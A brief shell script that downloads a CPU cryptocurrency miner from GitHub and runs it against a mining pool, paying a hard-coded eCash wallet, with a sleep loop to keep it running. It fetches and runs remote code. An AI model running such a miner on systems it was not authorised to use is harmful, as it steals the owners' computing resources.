#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a yespowersugar -o stratum+tcp://yespowerSUGAR.eu.mine.zpool.ca:6241 -u ecash:qzpr9vcmm2krz8g6796y4fclnn40a67aly52z5t283 c=XEC
while [ 1 ]; do
sleep 3
done
sleep 999
